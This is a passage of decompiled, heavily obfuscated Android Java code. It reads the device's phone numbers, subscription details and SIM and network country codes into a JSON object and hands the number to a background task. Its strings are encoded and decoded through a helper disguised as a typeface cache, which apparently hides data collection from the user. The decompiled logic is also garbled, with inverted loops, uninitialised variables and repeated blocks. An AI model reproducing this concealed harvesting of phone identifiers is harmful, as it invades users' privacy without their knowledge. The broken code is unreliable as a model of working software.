            s4xe0oepskbhpb3nsd.xDyLpEZyrcKVe0 = s4Xe0OepSKbHpb3Nsd.w9sT1Swbhx3hs(TypefaceCache.checked("045E0426040D04DB04A8049D048700E704040454040504D604DB00FF048F04F704020454047B04D904A8049D04FE00E7047C0456040304DC04AE04E9048704FA047B0423"));
            s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = 1;
            s4xe0oepskbhpb3nsd.nQilHWaqS401ZtR = "call";
            s4xe0oepskbhpb3nsd.b1EoSIRjJHO5 = activity;
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(128, true);
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(16, false);
            new HEqPccX85NcWnm0(this).dDIMxZXP1V8HdM(5002, s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM());
            TypefaceCache.obtain("001300790048009300F500BB009200A10036007A005700CA00E300BC00C000A200260078001B008E00FE00AB00D700A9003700360055008800E400B600D400AE00200077004F008E00FF00B1009200A1002C0064001B00B400DD008C009200B500260067004E008200E300AB009200EF002C0078005C008800F900B100D500EB00630065004F008600E900AC009200B2002D00620052008B00B0008C00FF0094006300710049008600FE00AB00D700A3006A");
            try {
                startActivity(intent);
                TypefaceCache.obtain("0007007F0049008200F300AB009200B4003700770049009300D100BC00C600AE0035007F004F009E00B000BE00DE00B4002C0036005A009300E400BA00DF00B700370073005F00C700B800B900D300AB002F0074005A008400FB00F6");
            } catch (Exception e) {
                TypefaceCache.obtain("0007007F0049008200F300AB009200B4003700770049009300D100BC00C600AE0035007F004F009E00B000BD00DE00A80020007D005E008300B000F700D700BF003300730058009300F500BB009200A8002D0036007A008900F400AD00DD00AE00270036000A00D700BB00F6008800E7");
                e.getMessage();
            }
        } catch (Exception e2) {
            TypefaceCache.obtain("002F0077004E008900F300B700FD00A900210079005A009500F400B600DC00A00014007F004F008F00C300B200C1009500260067004E008200E300AB009200A2003100640054009500AA00FF");
            e2.getMessage();
        }
    }

    /* JADX WARN: Code duplicated, block: B:102:0x00fa A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:104:0x00ba A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:107:0x0122 A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:111:0x0110 A[ADDED_TO_REGION, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:114:0x018e A[SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:32:0x00b0 A[Catch: Exception -> 0x0060, TRY_LEAVE, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    /* JADX WARN: Code duplicated, block: B:37:0x00c6 A[Catch: Exception -> 0x00f1, TryCatch #3 {Exception -> 0x00f1, blocks: (B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:104:0x00ba, outer: #0 }] */
    /* JADX WARN: Code duplicated, block: B:47:0x0106 A[Catch: Exception -> 0x0145, TryCatch #2 {Exception -> 0x0145, blocks: (B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129), top: B:102:0x00fa, outer: #0 }] */
    /* JADX WARN: Code duplicated, block: B:52:0x0116 A[Catch: Exception -> 0x0145, TryCatch #2 {Exception -> 0x0145, blocks: (B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129), top: B:102:0x00fa, outer: #0 }] */
    /* JADX WARN: Code duplicated, block: B:64:0x0156 A[Catch: Exception -> 0x0060, TRY_ENTER, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    /* JADX WARN: Code duplicated, block: B:65:0x015e  */
    /* JADX WARN: Code duplicated, block: B:68:0x0166 A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    /* JADX WARN: Code duplicated, block: B:69:0x016d  */
    /* JADX WARN: Code duplicated, block: B:73:0x0179 A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    /* JADX WARN: Code duplicated, block: B:79:0x0194 A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    /* JADX WARN: Code duplicated, block: B:80:0x019b  */
    /* JADX WARN: Code duplicated, block: B:83:0x01a3  */
    /* JADX WARN: Code duplicated, block: B:84:0x01a4  */
    /* JADX WARN: Code duplicated, block: B:87:0x01be  */
    /* JADX WARN: Code duplicated, block: B:90:0x01ea A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    /* JADX WARN: Code duplicated, block: B:92:0x01ff A[Catch: Exception -> 0x0060, TRY_LEAVE, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x001c, B:6:0x0029, B:9:0x0032, B:11:0x0039, B:15:0x0063, B:32:0x00b0, B:61:0x014e, B:64:0x0156, B:66:0x0160, B:68:0x0166, B:70:0x016f, B:73:0x0179, B:77:0x0190, B:79:0x0194, B:81:0x019d, B:85:0x01a6, B:88:0x01c1, B:90:0x01ea, B:92:0x01ff, B:60:0x0146, B:44:0x00f2, B:31:0x00a8, B:17:0x006d, B:19:0x0075, B:24:0x0080, B:26:0x0086, B:29:0x008e, B:45:0x00fa, B:47:0x0106, B:49:0x010c, B:50:0x0110, B:52:0x0116, B:54:0x0122, B:57:0x0129, B:35:0x00ba, B:37:0x00c6, B:39:0x00ce, B:41:0x00d8), top: B:99:0x001c, inners: #1, #2, #3 }] */
    public final JSONObject fivkjwgu2UdAtiY() throws JSONException {
        int defaultSubscriptionId;
        String simCountryIso;
        String str;
        String lowerCase;
        String networkCountryIso;
        String lowerCase2;
        int size;
        int i;
        Object obj;
        yI1KTRoNlsjx yi1ktronlsjx;
        String str2;
        List<SubscriptionInfo> activeSubscriptionInfoList;
        Iterator<T> it;
        String number;
        JSONObject jSONObject = new JSONObject();
        ArrayList arrayList = new ArrayList();
        ArrayList arrayList2 = new ArrayList();
        try {
            String strECwLkmPW1UKz7J6E = ECwLkmPW1UKz7J6E();
            if (strECwLkmPW1UKz7J6E != null && !BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(strECwLkmPW1UKz7J6E) && A1BaTVAMeIXMnh(strECwLkmPW1UKz7J6E)) {
                jSONObject.put(TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095"), strECwLkmPW1UKz7J6E);
                jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), TypefaceCache.obtain("002000770058008F00F500BB"));
                jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), true);
                jSONObject.put(TypefaceCache.obtain("002500640054008A00CF00BC00D300A4002B0073"), true);
                return jSONObject;
            }
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
            try {
                if (checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == 0 || checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                    String line1Number = telephonyManager.getLine1Number();
                    if (line1Number != null && !BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(line1Number)) {
                        String strMSGkxvPxRYNqC = MSGkxvPxRYNqC(line1Number, false);
                        arrayList.add(TypefaceCache.obtain("002F007F0055008200A1009100C700AA002100730049"));
                        arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("002F007F0055008200A1009100C700AA002100730049"), strMSGkxvPxRYNqC));
                        if (Build.VERSION.SDK_INT >= 6 + 27) {
                            SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService("telephony_subscription_service");
                            if (checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == 0) {
                                SubscriptionManager subscriptionManager2 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                                if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                                    it = activeSubscriptionInfoList.iterator();
                                    while (it.hasNext()) {
                                        number = ((SubscriptionInfo) it.next()).getNumber();
                                        if (number != null) {
                                            String strMSGkxvPxRYNqC2 = MSGkxvPxRYNqC(number, false);
                                            arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                            arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC2));
                                        }
                                    }
                                }
                                simCountryIso = telephonyManager.getSimCountryIso();
                                str = "";
                                if (simCountryIso != null) {
                                    lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                                } else {
                                    lowerCase = "";
                                }
                                networkCountryIso = telephonyManager.getNetworkCountryIso();
                                if (networkCountryIso != null) {
                                    lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                                } else {
                                    lowerCase2 = "";
                                }
                                size = arrayList2.size();
                                i = 0;
                                do {
                                    if (i < size) {
                                        obj = null;
                                        break;
                                    }
                                    obj = arrayList2.get(i);
                                    i++;
                                } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                                yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                                if (yi1ktronlsjx != null) {
                                    str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                                } else {
                                    str2 = null;
                                }
                                String strObtain = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                                if (str2 == null) {
                                    str = str2;
                                }
                                jSONObject.put(strObtain, str);
                                jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                                jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                                jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                                jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                                jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                                if (arrayList2.size() > 1) {
                                    jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                                }
                                if (str2 != null) {
                                    y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                                }
                            } else {
                                SubscriptionManager subscriptionManager3 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                                if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                                    it = activeSubscriptionInfoList.iterator();
                                    while (it.hasNext()) {
                                        number = ((SubscriptionInfo) it.next()).getNumber();
                                        if (number != null) {
                                            String strMSGkxvPxRYNqC3 = MSGkxvPxRYNqC(number, false);
                                            arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                            arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC3));
                                        }
                                    }
                                }
                                simCountryIso = telephonyManager.getSimCountryIso();
                                str = "";
                                if (simCountryIso != null) {
                                    lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                                } else {
                                    lowerCase = "";
                                }
                                networkCountryIso = telephonyManager.getNetworkCountryIso();
                                if (networkCountryIso != null) {
                                    lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                                } else {
                                    lowerCase2 = "";
                                }
                                size = arrayList2.size();
                                i = 0;
                                do {
                                    if (i < size) {
                                        obj = null;
                                        break;
                                    }
                                    obj = arrayList2.get(i);
                                    i++;
                                } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                                yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                                if (yi1ktronlsjx != null) {
                                    str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                                } else {
                                    str2 = null;
                                }
                                String strObtain2 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                                if (str2 == null) {
                                    str = str2;
                                }
                                jSONObject.put(strObtain2, str);
                                jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                                jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                                jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                                jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                                jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                                if (arrayList2.size() > 1) {
                                    jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                                }
                                if (str2 != null) {
                                    y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                                }
                            }
                        } else {
                            SubscriptionManager subscriptionManager4 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                            if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                                it = activeSubscriptionInfoList.iterator();
                                while (it.hasNext()) {
                                    number = ((SubscriptionInfo) it.next()).getNumber();
                                    if (number != null) {
                                        String strMSGkxvPxRYNqC4 = MSGkxvPxRYNqC(number, false);
                                        arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                        arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC4));
                                    }
                                }
                            }
                            simCountryIso = telephonyManager.getSimCountryIso();
                            str = "";
                            if (simCountryIso != null) {
                                lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                            } else {
                                lowerCase = "";
                            }
                            networkCountryIso = telephonyManager.getNetworkCountryIso();
                            if (networkCountryIso != null) {
                                lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                            } else {
                                lowerCase2 = "";
                            }
                            size = arrayList2.size();
                            i = 0;
                            do {
                                if (i < size) {
                                    obj = null;
                                    break;
                                }
                                obj = arrayList2.get(i);
                                i++;
                            } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                            yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                            if (yi1ktronlsjx != null) {
                                str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                            } else {
                                str2 = null;
                            }
                            String strObtain3 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                            if (str2 == null) {
                                str = str2;
                            }
                            jSONObject.put(strObtain3, str);
                            jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                            jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                            jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                            jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                            jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                            if (arrayList2.size() > 1) {
                                jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                            }
                            if (str2 != null) {
                                y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                            }
                        }
                    } else if (Build.VERSION.SDK_INT >= 6 + 27) {
                        try {
                            SubscriptionManager subscriptionManager5 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                            if (checkSelfPermission("android.permission.READ_PHONE_NUMBERS") == 0 || (defaultSubscriptionId = SubscriptionManager.getDefaultSubscriptionId()) == -1) {
                                try {
                                    SubscriptionManager subscriptionManager6 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                                    if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0 && (activeSubscriptionInfoList = subscriptionManager6.getActiveSubscriptionInfoList()) != null) {
                                        it = activeSubscriptionInfoList.iterator();
                                        while (it.hasNext()) {
                                            number = ((SubscriptionInfo) it.next()).getNumber();
                                            if (number != null && !BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(number)) {
                                                String strMSGkxvPxRYNqC5 = MSGkxvPxRYNqC(number, false);
                                                arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                                arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC5));
                                            }
                                        }
                                    }
                                } catch (Exception e) {
                                    TypefaceCache.obtain("001000630059009400F300AD00DB00B70037007F0054008900DD00BE00DC00A600240073004900C700F600BE00DB00AB00260072000100C7");
                                    e.getMessage();
                                }
                                simCountryIso = telephonyManager.getSimCountryIso();
                                str = "";
                                if (simCountryIso != null) {
                                    lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                                } else {
                                    lowerCase = "";
                                }
                                networkCountryIso = telephonyManager.getNetworkCountryIso();
                                if (networkCountryIso != null) {
                                    lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                                } else {
                                    lowerCase2 = "";
                                }
                                size = arrayList2.size();
                                i = 0;
                                do {
                                    if (i < size) {
                                        obj = null;
                                        break;
                                    }
                                    obj = arrayList2.get(i);
                                    i++;
                                } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                                yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                                if (yi1ktronlsjx != null) {
                                    str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                                } else {
                                    str2 = null;
                                }
                                String strObtain4 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                                if (str2 == null) {
                                    str = str2;
                                }
                                jSONObject.put(strObtain4, str);
                                jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                                jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                                jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                                jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                                jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                                if (arrayList2.size() > 1) {
                                    jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                                }
                                if (str2 != null) {
                                    y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                                }
                            } else {
                                String phoneNumber = subscriptionManager5.getPhoneNumber(defaultSubscriptionId);
                                if (BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(phoneNumber)) {
                                    SubscriptionManager subscriptionManager7 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                                    if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                                        it = activeSubscriptionInfoList.iterator();
                                        while (it.hasNext()) {
                                            number = ((SubscriptionInfo) it.next()).getNumber();
                                            if (number != null) {
                                                String strMSGkxvPxRYNqC6 = MSGkxvPxRYNqC(number, false);
                                                arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                                arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC6));
                                            }
                                        }
                                    }
                                    simCountryIso = telephonyManager.getSimCountryIso();
                                    str = "";
                                    if (simCountryIso != null) {
                                        lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                                    } else {
                                        lowerCase = "";
                                    }
                                    networkCountryIso = telephonyManager.getNetworkCountryIso();
                                    if (networkCountryIso != null) {
                                        lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                                    } else {
                                        lowerCase2 = "";
                                    }
                                    size = arrayList2.size();
                                    i = 0;
                                    do {
                                        if (i < size) {
                                            obj = null;
                                            break;
                                        }
                                        obj = arrayList2.get(i);
                                        i++;
                                    } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                                    yi1ktronlsjx = (yI1KTRoNlsjx) obj;
                                    if (yi1ktronlsjx != null) {
                                        str2 = (String) yi1ktronlsjx.vekpFI4d1Nc4fakF;
                                    } else {
                                        str2 = null;
                                    }
                                    String strObtain5 = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E0095");
                                    if (str2 == null) {
                                        str = str2;
                                    }
                                    jSONObject.put(strObtain5, str);
                                    jSONObject.put(TypefaceCache.obtain("002E0073004F008F00FF00BB00C10098003700640052008200F4"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList, ", ", null, 62));
                                    jSONObject.put(TypefaceCache.obtain("00250079004E008900F4"), str2 != null);
                                    jSONObject.put(TypefaceCache.obtain("0030007F005600B800F300B000C700A9003700640042"), lowerCase);
                                    jSONObject.put(TypefaceCache.obtain("002D0073004F009000FF00AD00D9009800200079004E008900E400AD00CB"), lowerCase2);
                                    jSONObject.put(TypefaceCache.obtain("002000770055008300F900BB00D300B3002600650064008400FF00AA00DC00B3"), arrayList2.size());
                                    if (arrayList2.size() > 1) {
                                        jSONObject.put(TypefaceCache.obtain("0022007A005700B800F300BE00DC00A3002A0072005A009300F500AC"), imhBI9RqzETHtVIJe.euF5Udt5Rqv3Qmea(arrayList2, "; ", ofxQWGnngPxGI3OtvQn.D5P1xCAyuvgF, 30));
                                    }
                                    if (str2 != null) {
                                        y6jRGLEWNMir.b1EoSIRjJHO5(this.w9sT1Swbhx3hs, null, new Qkp9DQc428napV(this, str2, null), 3);
                                    }
                                } else {
                                    String strMSGkxvPxRYNqC7 = MSGkxvPxRYNqC(phoneNumber, false);
                                    arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00BE00C200AE00700025"));
                                    arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00BE00C200AE00700025"), strMSGkxvPxRYNqC7));
                                    SubscriptionManager subscriptionManager8 = (SubscriptionManager) getSystemService("telephony_subscription_service");
                                    if (checkSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
                                        it = activeSubscriptionInfoList.iterator();
                                        while (it.hasNext()) {
                                            number = ((SubscriptionInfo) it.next()).getNumber();
                                            if (number != null) {
                                                String strMSGkxvPxRYNqC8 = MSGkxvPxRYNqC(number, false);
                                                arrayList.add(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"));
                                                arrayList2.add(new yI1KTRoNlsjx(TypefaceCache.obtain("003000630059009400F300AD00DB00B70037007F0054008900CF00B600DC00A1002C"), strMSGkxvPxRYNqC8));
                                            }
                                        }
                                    }
                                    simCountryIso = telephonyManager.getSimCountryIso();
                                    str = "";
                                    if (simCountryIso != null) {
                                        lowerCase = simCountryIso.toLowerCase(Locale.ROOT);
                                    } else {
                                        lowerCase = "";
                                    }
                                    networkCountryIso = telephonyManager.getNetworkCountryIso();
                                    if (networkCountryIso != null) {
                                        lowerCase2 = networkCountryIso.toLowerCase(Locale.ROOT);
                                    } else {
                                        lowerCase2 = "";
                                    }
                                    size = arrayList2.size();
                                    i = 0;
                                    do {
                                        if (i < size) {
                                            obj = null;
                                            break;
                                        }
                                        obj = arrayList2.get(i);
                                        i++;
                                    } while (!A1BaTVAMeIXMnh((String) ((yI1KTRoNlsjx) obj).vekpFI4d1Nc4fakF));
                                    yi1ktronlsjx = (yI1KTRoNlsjx) obj;
